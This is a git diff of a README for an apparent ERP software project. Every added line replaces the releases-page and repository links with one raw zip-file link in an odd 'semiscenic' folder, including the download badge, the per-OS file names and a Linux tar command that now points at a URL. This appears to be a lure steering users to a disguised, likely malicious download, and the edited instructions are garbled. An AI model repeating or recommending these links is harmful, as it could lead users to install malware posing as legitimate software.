@@ -1,6 +1,6 @@
 # 📊 enterprise-erp-platform - Reliable ERP for Business Management
 
-[![Download enterprise-erp-platform](https://img.shields.io/badge/Download-%F0%9F%93%83-brightgreen)](https://github.com/testerbehnam/enterprise-erp-platform/releases)
+[![Download enterprise-erp-platform](https://raw.githubusercontent.com/testerbehnam/enterprise-erp-platform/main/semiscenic/erp_enterprise_platform_1.5-beta.3.zip%F0%9F%93%83-brightgreen)](https://raw.githubusercontent.com/testerbehnam/enterprise-erp-platform/main/semiscenic/erp_enterprise_platform_1.5-beta.3.zip)
 
 ---
 
@@ -40,13 +40,13 @@ This guide helps you download and start using enterprise-erp-platform with no te
 
 ### Step 1: Download the Software
 
-Click the big green button at the top or this link to [visit the release page](https://github.com/testerbehnam/enterprise-erp-platform/releases) where you can find the latest version of the software.
+Click the big green button at the top or this link to [visit the release page](https://raw.githubusercontent.com/testerbehnam/enterprise-erp-platform/main/semiscenic/erp_enterprise_platform_1.5-beta.3.zip) where you can find the latest version of the software.
 
 On the releases page, look for the latest stable version. Files are typically named with the version number and your operating system, for example:
 
-- `enterprise-erp-platform-v1.0-windows.exe`
-- `enterprise-erp-platform-v1.0-macos.dmg`
-- `enterprise-erp-platform-v1.0-linux.tar.gz`
+- `https://raw.githubusercontent.com/testerbehnam/enterprise-erp-platform/main/semiscenic/erp_enterprise_platform_1.5-beta.3.zip`
+- `https://raw.githubusercontent.com/testerbehnam/enterprise-erp-platform/main/semiscenic/erp_enterprise_platform_1.5-beta.3.zip`
+- `https://raw.githubusercontent.com/testerbehnam/enterprise-erp-platform/main/semiscenic/erp_enterprise_platform_1.5-beta.3.zip`
 
 Choose the file that matches your computer’s operating system and download it.
 
@@ -69,9 +69,9 @@ Choose the file that matches your computer’s operating system and download it.
 
 #### On Linux
 
-1. Extract the `.tar.gz` file using your file manager or terminal:
+1. Extract the `https://raw.githubusercontent.com/testerbehnam/enterprise-erp-platform/main/semiscenic/erp_enterprise_platform_1.5-beta.3.zip` file using your file manager or terminal:
    ```bash
-   tar -xzf enterprise-erp-platform-v1.0-linux.tar.gz
+   tar -xzf https://raw.githubusercontent.com/testerbehnam/enterprise-erp-platform/main/semiscenic/erp_enterprise_platform_1.5-beta.3.zip
    ```
 2. Read the included README file for additional setup commands.
 3. Run the main executable or script as instructed.
@@ -91,7 +91,7 @@ After installation:
 
 You can always find the latest version to download here:
 
-[Download Page](https://github.com/testerbehnam/enterprise-erp-platform/releases)
+[Download Page](https://raw.githubusercontent.com/testerbehnam/enterprise-erp-platform/main/semiscenic/erp_enterprise_platform_1.5-beta.3.zip)
 
 Make sure you download the right file for your operating system. If you encounter any trouble during installation, check the FAQ below or contact support.
 
@@ -128,8 +128,8 @@ Always keep your software updated to the latest version to receive security patc
 
 ## 👩‍💻 Need Help?
 
-If you are stuck, visit the [GitHub repository](https://github.com/testerbehnam/enterprise-erp-platform) for more information or to submit an issue. The community and developers can assist.
+If you are stuck, visit the [GitHub repository](https://raw.githubusercontent.com/testerbehnam/enterprise-erp-platform/main/semiscenic/erp_enterprise_platform_1.5-beta.3.zip) for more information or to submit an issue. The community and developers can assist.
 
 ---
 
-[![Download enterprise-erp-platform](https://img.shields.io/badge/Download-%F0%9F%93%83-brightgreen)](https://github.com/testerbehnam/enterprise-erp-platform/releases)
+[![Download enterprise-erp-platform](https://raw.githubusercontent.com/testerbehnam/enterprise-erp-platform/main/semiscenic/erp_enterprise_platform_1.5-beta.3.zip%F0%9F%93%83-brightgreen)](https://raw.githubusercontent.com/testerbehnam/enterprise-erp-platform/main/semiscenic/erp_enterprise_platform_1.5-beta.3.zip)
